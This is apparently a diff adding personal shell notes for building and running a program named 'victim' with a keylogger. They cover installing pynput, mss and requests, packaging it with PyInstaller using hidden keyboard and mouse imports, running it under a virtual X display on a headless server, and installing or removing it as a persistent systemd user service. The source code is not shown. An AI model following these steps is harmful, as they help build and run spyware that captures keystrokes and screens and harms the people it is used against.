@@ -1,0 +1,29 @@
+systemctl --user stop victim.service
+systemctl --user disable victim.service
+rm ~/.config/systemd/user/victim.service
+rm ~/.config/systemd/user/default.target.wants/victim.service
+rm ~/.local/bin/victim
+systemctl --user daemon-reload
+systemctl --user list-units --type=service | grep victim
+systemctl --user restart
+
+
+
+rm -rf build/ dist/ victim.py  victim.spec keylogger.py
+
+DACA INCLUD KEYLOGGER PTC EC2 NU ARE UI:
+pyinstaller --onefile victim.py
+
+ pip3 install requests mss pynput
+ pyinstaller --onefile --hidden-import=pynput.keyboard --hidden-import=requests --hidden-import=mss victim.py
+
+  python3 -m PyInstaller victim.py --onefile --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg
+
+sudo apt-get update
+sudo apt-get install xvfb xorg openbox
+pkill Xvfb
+rm /tmp/.X*-lock
+Xvfb :1 -screen 0 1024x768x16 -nolisten tcp -fp /usr/share/fonts/X11/misc/ &
+export DISPLAY=:1
+ps aux | grep Xvfb
+xvfb-run -a ./dist/victim
